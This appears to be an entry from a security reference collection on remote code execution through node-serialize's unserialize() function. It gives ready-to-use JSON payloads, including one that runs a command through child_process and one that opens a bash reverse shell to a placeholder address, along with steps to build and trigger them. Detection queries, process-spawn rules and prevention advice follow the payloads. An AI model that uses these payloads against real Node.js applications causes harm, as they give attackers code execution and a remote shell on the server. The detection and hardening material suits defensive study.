name: Node.js node-serialize unserialize() RCE
description: The node-serialize package's unserialize() will evaluate a function embedded in the serialized data when it is tagged with the _$$ND_FUNC$$_ marker and wrapped as an Immediately Invoked Function Expression (IIFE), giving remote code execution the moment unserialize() runs on attacker input. The same flaw affects funcster and serialize-to-js and any serializer that restores JavaScript functions.
notes:
=== IDENTIFY A NODE SERIALIZE SINK ===
  # App calls require('node-serialize').unserialize(req.cookies/body) or similar.
  # Payloads carry the marker _$$ND_FUNC$$_ followed by a function body.

=== BUILD THE PAYLOAD ===
  # A serialized function is tagged: "_$$ND_FUNC$$_function(){...}".
  # Appending () after the function body turns it into an IIFE that runs on unserialize().
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}

=== REVERSE SHELL PAYLOAD ===
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<ip>/<port> 0>&1\"');}()"}
  # Deliver as a cookie/body value where unserialize() reads it.

=== GENERATE WITH node-serialize ITSELF ===
  var serialize = require('node-serialize');
  var o = {rce: function(){ require('child_process').exec('id'); }};
  var payload = serialize.serialize(o);
  // then edit the serialized string to append () after the function so it self-invokes.

=== TRIGGER ===
  var serialize = require('node-serialize');
  serialize.unserialize(attacker_json);   // IIFE fires -> command runs

=== VARIANTS ===
  funcster.deepDeserialize(data)      # evaluates module-wrapped functions
  serialize-to-js deserialize()       # function restoration
  cryo / older custom serializers

=== ALTERNATIVES ===
  Python pickle - see deser-python-pickle
  PHP phpggc - see deser-php-phpggc

examples.label: Serialize an object to get the function format

references.title: OpsecX - Exploiting Node.js deserialization for RCE

Python pickle RCE, a sibling runtime.

defense.why_it_works: node-serialize restores JavaScript functions from its serialized form; the _$$ND_FUNC$$_ marker tells it to eval the function body, and an appended () makes that function self-invoke during unserialize(). Restoring executable code from untrusted input is the bug.
defense.prerequisites: An endpoint passing attacker-controlled data to node-serialize unserialize() (or funcster/serialize-to-js equivalents).
defense.impact: Remote code execution as the Node.js process user.
defense.detection: [MITRE T1190] Requests/cookies containing the literal _$$ND_FUNC$$_ marker or child_process references; [MITRE T1059] the node process spawning sh/bash/cmd children.
defense.artifacts: Web/proxy logs and cookie values with _$$ND_FUNC$$_ or child_process.exec strings; EDR/auditd process tree node -> sh/bash; outbound connections from the app host.
defense.splunk_spl:
index=web (request_body="*_$$ND_FUNC$$_*" OR http_cookie="*_$$ND_FUNC$$_*" OR request_body="*child_process*")
| table _time, src_ip, uri_path, request_body
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("node","node.exe")
| where FileName in~ ("sh","bash","dash","cmd.exe","powershell.exe")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
defense.prevention: Do not use node-serialize/funcster on untrusted input; use JSON.parse (which never restores functions). Validate and schema-check all input; keep dependencies audited (npm audit); run the Node process least-privileged and segmented.

detections.name: Node.js process spawning a shell (node-serialize RCE)
detections.logic:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("node","node.exe")
| where FileName in~ ("sh","bash","dash","cmd.exe","powershell.exe","curl","wget")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
detections.false_positives: Node tooling or build steps that spawn shells
detections.tuning: Scope to production app tiers; allowlist known CI/deploy hosts
